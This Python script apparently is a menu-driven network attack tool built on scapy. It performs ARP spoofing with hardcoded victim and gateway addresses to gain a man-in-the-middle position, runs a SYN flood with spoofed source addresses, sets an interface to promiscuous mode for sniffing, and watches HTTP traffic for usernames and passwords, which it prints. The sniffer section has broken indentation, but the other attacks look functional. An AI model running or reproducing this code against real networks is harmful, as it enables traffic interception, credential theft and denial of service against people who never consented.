#!/usr/bin/env python
import time

import scapy.all as scapy  # arp SPOOFING MITM attack
from scapy.layers import http
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.layers.inet import TCP, IP
import argparse
from scapy.layers import http
# Importing the necessary modules
import logging
from datetime import datetime
import subprocess
import sys
import os
import time

# This will suppress all messages that have a lower level of seriousness than error messages, while running or loading Scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)



def main():
    print("Please choose the options to run the attacking script program: \n"
          "1: ARP Spoof attack\n"
          "2: TCP Syn Flooding Attack\n"
          "3: Network Scanning\n"
          "4: Sniff Packets\n"
          "\nPlease Ctrl C to exit out of script")
    switch = input("\nPlease enter the number: ")

    if switch == "1":
        def getting_mac(ip):
            req_arp = scapy.ARP(pdst=ip)
            broadcastmac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set dst mac as broadcast mac
            broadcast_arp_req = broadcastmac / req_arp
            answering_list = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[0]

            return answering_list[0][1].hwsrc  # first element, access the first IP, access element mac using hwsrc, return the MAC address of the IP we give

        def spoof_arp(target_ip, spoofed_ip):
            target_mac = getting_mac(target_ip)
            capturedpacket = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)  # fooling target that it is the router #hwdst is mac address and psrc is target IP
            scapy.send(capturedpacket, verbose=False)

        def restore(dst_IP, src_ip):
            dst_mac = getting_mac(dst_IP)
            src_mac = getting_mac(src_ip)
            capturedpacket = scapy.ARP(op=2, pdst=dst_IP, hwdst=dst_mac, psrc=src_ip, hwsrc = src_mac)
            scapy.send(capturedpacket, verbose=False)

        target_ip = "192.168.1.119"
        gateway_ip = "192.168.1.1"

        try:
            packets_sending_count = 0
            while (True):
                spoof_arp(target_ip, gateway_ip)
                spoof_arp(gateway_ip, target_ip)
                packets_sending_count = packets_sending_count + 2
                print("\r[+] packets being sent: " + str(packets_sending_count), end="") ,
                sys.stdout.flush()
                time.sleep(2)

        except KeyboardInterrupt:
            print("\n Detected CTRL C! Let's reset the ARP table...\n")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
        # spoofarp("10.0.2.15", "10.0.2.2")# tell the computer i am the router
        # spoofarp("10.0.2.2", "10.0.2.15")# tell the router i am the victim
        # #IP of the target computer, pdst and hwdst is mac address of target machine
        # #source IP psrc (ip of router) op sent as a arp response
    elif switch == "2":

        def syncflooding(srcip, tgtip):
            for sourceport in range(1024, 65535):
                layer3 = IP(src=srcip, dst=tgtip)
                layer4 = TCP(sport=sourceport, dport=1337)
                packet = layer3 / layer4
                scapy.send(packet)

        src = "10.0.3.2"
        dst = "10.0.2.2"

        syncflooding(src, dst)

    elif switch == "3":

        # Asking the user for some parameters: interface on which to sniff, the number of packets to sniff, the time interval to sniff, the protocol

        # Asking the user for input - the interface on which to run the sniffer
        net_iface = input("Please enter the interface to run the sniffer script: ")

        # Setting network interface in promiscuous mode
        try:
            subprocess.call(["ifconfig", net_iface, "promisc"], stdout=None, stderr=None, shell=False)

        except:
            print("\nUnable to configure the interface as promiscuous.\n")

        else:
            # Executed if the try clause does not raise an exception
            print("\n You are now set! Interface %s set to PROMISC mode.\n" % net_iface)

        # Asking the user for the number of packets to sniff (the "count" parameter)
        pkt_to_sniff = input("Please enter the number of packets to capture (0==infinity): ")

        # Considering the case when the user enters 0 (infinity)
        if int(pkt_to_sniff) != 0:
            print("\nYou have entered infinity number of packets. Program will capture %d packets.\n" % int(pkt_to_sniff))

        elif int(pkt_to_sniff) == 0:
            print("\nThe program will capture packets until the timeout expires.\n")

        # Asking the user for the time interval to sniff (the "timeout" parameter)
        time_to_sniff = input("Please enter the number of seconds to run the capture: ")

        # Handling the value entered by the user
        if int(time_to_sniff) != 0:
            print("\nThe program will capture packets for %d seconds.\n" % int(time_to_sniff))

        # Asking the user for any protocol filter he might want to apply to the sniffing process
        # For this example I chose three protocols: ARP, BOOTP, ICMP
        # You can customize this to add your own desired protocols
        proto_sniff = input("* Enter the protocol to filter by (arp|bootp|icmp|0 is all): ")

        # Considering the case when the user enters 0 (meaning all protocols)
        if (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
            print("\nThe program will capture only %s packets.\n" % proto_sniff.upper())

        elif (proto_sniff) == "0":
            print("\nThe program will capture all protocols.\n")

        # Asking the user to enter the name and path of the log file to be created
        file_name = input("* Please give a name to the log file: ")

        # Creating the text file (if it doesn't exist) for packet logging and/or opening it for appending
        sniffer_log = open(file_name, "a")

        # This is the function that will be called for each captured packet
        # The function will extract parameters from the packet and then log each packet to the log file
        def packet_log(packet):
            # Getting the current timestamp
            now = datetime.now()

            # Writing the packet information to the log file, also considering the protocol or 0 for all protocols
            if proto_sniff == "0":
                # Writing the data to the log file
                print("Time: " + str(now) + " Protocol: ALL" + " SMAC: " + packet[0].src + " DMAC: " + packet[0].dst, file=sniffer_log)
            elif (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
            # Writing the data to the log file
                print("Time: " + str(now) + " Protocol: " + proto_sniff.upper() + " SMAC: " + packet[0].src + " DMAC: " + packet[0].dst, file=sniffer_log)

        # Printing an informational message to the screen
                print("\n* Starting the capture...")

        # Running the sniffing process (with or without a filter)
            if proto_sniff == "0":
                sniff(iface=net_iface, count=int(pkt_to_sniff), timeout=int(time_to_sniff), prn=packet_log)

            elif (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
                sniff(iface=net_iface, filter=proto_sniff, count=int(pkt_to_sniff), timeout=int(time_to_sniff), prn=packet_log)

            else:
                print("\nCould not identify the protocol.\n")
                sys.exit()

            # Printing the closing message
            print("\n* Please check the %s file to see the captured packets.\n" % file_name)

            # Closing the log file
            sniffer_log.close()

    elif switch == "4":

        def sniff(interface):
            scapy.sniff(iface=interface, store=False, prn=execute_sniffed_packet)  # tells scapy not to store packets in memory (store)
            # PRN specifies callback function, function is called everytime a packet is captured
            # filter looking for packets sent over UDP, FTP, port 21, anything that you want

        def gettingtheurl(capturedpacket):
            return capturedpacket[http.HTTPRequest].Host + capturedpacket[http.HTTPRequest].Path


        def gettingloginandpassinfo(capturedpacket):
            if capturedpacket.haslayer(scapy.Raw):
                load = str(capturedpacket[scapy.Raw].load)
                lookingforkeywords = ["Username", "Email Address", "Password", "pass"]
                for keyword in lookingforkeywords:
                    if keyword in load:
                        return load

        def execute_sniffed_packet(capturedpacket):
            if capturedpacket.haslayer(http.HTTPRequest):
                thisistheurl = capturedpacket[http.HTTPRequest].Host + capturedpacket[http.HTTPRequest].Path
                print("[+] HTTP Requesting >> " + thisistheurl)

                login_and_passinfo = gettingloginandpassinfo(capturedpacket)
                if login_and_passinfo:
                    print("[+] THe username/pass is probably here!! > " + login_and_passinfo + "\n\n")

        sniff("eth0")

main()
